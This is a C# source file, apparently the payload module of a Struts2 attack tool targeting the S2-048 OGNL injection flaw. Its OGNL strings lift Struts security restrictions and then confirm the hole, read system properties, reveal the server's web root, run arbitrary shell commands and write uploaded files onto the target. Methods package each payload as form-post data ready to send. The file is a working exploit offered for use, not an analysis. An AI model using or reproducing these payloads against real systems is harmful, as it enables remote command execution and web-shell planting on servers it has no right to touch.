using System;
using System.Collections.Generic;
using System.Text;
using System.Web;
using tools;

namespace payload
{
    public class S2048:BasePayload
    {
        private String Exp_Check = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('start:struts2_security_')).(#res.getWriter().print('check:end')).(#res.getWriter().flush()).(#res.getWriter().close())}";
        private String Exp_VerInfo = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print(':start')).(#res.getWriter().print('[vername]:')).(#res.getWriter().print(@java.lang.System@getProperty('[vername]'))).(#res.getWriter().print(':end')).(#res.getWriter().flush()).(#res.getWriter().close())}";

        private String Exp_Path= "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('start:web')).(#res.getWriter().print('path:')).(#res.getWriter().print(#req.getSession().getServletContext().getRealPath('/'))).(#res.getWriter().print(':end')).(#res.getWriter().flush()).(#res.getWriter().close())}";

        private String Exp_Exec = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('start:')).(#s=new java.util.Scanner((new java.lang.ProcessBuilder('[cmd]'.toString().split('\\\\s'))).start().getInputStream()).useDelimiter('\\\\AAAA')).(#str=#s.hasNext()?#s.next():'').(#res.getWriter().print(#str)).(#res.getWriter().print(':end')).(#res.getWriter().flush()).(#res.getWriter().close()).(#s.close())}";


        //private String Exp_Upload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(new java.io.BufferedWriter(new java.io.FileWriter([path])).append(#req.getHeader('test')).close()).(#res.getWriter().print('oko')).(#res.getWriter().print('kok/')).(#res.getWriter().print(#req.getContextPath())).(#res.getWriter().flush()).(#res.getWriter().close())}";
        //private String Exp_Upload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(new java.io.BufferedWriter(new java.io.FileWriter([path])).append(new java.net.URLDecoder().decode(#req.getHeader('test'),'UTF-8')).close()).(#res.getWriter().print('oko')).(#res.getWriter().print('kok/')).(#res.getWriter().print(#req.getContextPath())).(#res.getWriter().flush()).(#res.getWriter().close())}";
        //大文件
        private String Exp_Upload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('start:')).(#fs=new java.io.FileOutputStream(#req.getSession().getServletContext().getRealPath('/[pathfilename]'))).(#out=#res.getOutputStream()).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),#fs)).(#fs.close()).(#out.print('oko')).(#out.print('kok/:end')).(#out.print(#req.getContextPath())).(#out.close())}";

        private String Exp_SetMyUpload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('start:')).(new java.io.File('[path]').mkdirs()).(#fs=new java.io.FileOutputStream('[pathfilename]')).(#out=#res.getOutputStream()).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),#fs)).(#fs.close()).(#out.print('oko')).(#out.print('kok/:end')).(#out.print(#req.getContextPath())).(#out.close())}";

        public String Get_Exp_Check()
        {
            String data = String.Format("name={0}&age=a&__checkbox_bustedBefore=true&description=s", URLEncode.UrlEncode(this.Exp_Check));
            return data;
        }
        public String Get_Exp_VerInfo(String vername)
        {
            String data=this.Exp_VerInfo.Replace("[vername]", vername);
            return String.Format("name={0}&age=a&__checkbox_bustedBefore=true&description=s", System.Web.HttpUtility.UrlEncode(data));
        }
        public String Get_Exp_Path() {
            return String.Format("name={0}&age=a&__checkbox_bustedBefore=true&description=s", System.Web.HttpUtility.UrlEncode(this.Exp_Path));
        }
        public String Get_Exp_Exec(String cmd)
        {
            String data= this.Exp_Exec.Replace("[cmd]",cmd);
            return String.Format("name={0}&age=a&__checkbox_bustedBefore=true&description=s", System.Web.HttpUtility.UrlEncode(data));
        }
        public String Get_Exp_Upload(String path,String fileName,String fileContent)
        {
            String data = "";
            if ("".Equals(path))
            {
                this.Exp_Upload = this.Exp_Upload.Replace("[pathfilename]", fileName);
                data= this.Exp_Upload.Replace("[filecontent]", fileContent);
            }
            else
            {
                this.Exp_SetMyUpload = this.Exp_Upload.Replace("[path]", path);
                this.Exp_SetMyUpload = this.Exp_Upload.Replace("[pathfilename]", path + "/" + fileName);
                data=this.Exp_SetMyUpload.Replace("[filecontent]", fileContent);
            }
            return String.Format("name={0}&age=a&__checkbox_bustedBefore=true&description=s", System.Web.HttpUtility.UrlEncode(data));
        }
    }
}
